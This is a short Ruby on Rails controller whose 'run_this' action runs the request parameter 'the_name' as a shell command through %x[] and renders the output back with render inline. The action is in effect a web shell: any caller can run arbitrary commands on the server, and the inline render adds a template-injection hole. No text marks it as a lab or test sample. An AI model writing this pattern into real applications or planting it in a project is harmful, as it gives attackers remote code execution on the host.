class ApiCommandController < ApplicationController

    def index
    end

    def run_this
        @run = params[:the_name]
        @rpc = %x[#{@run}]
        puts @rpc
        render inline: @rpc
    end
end
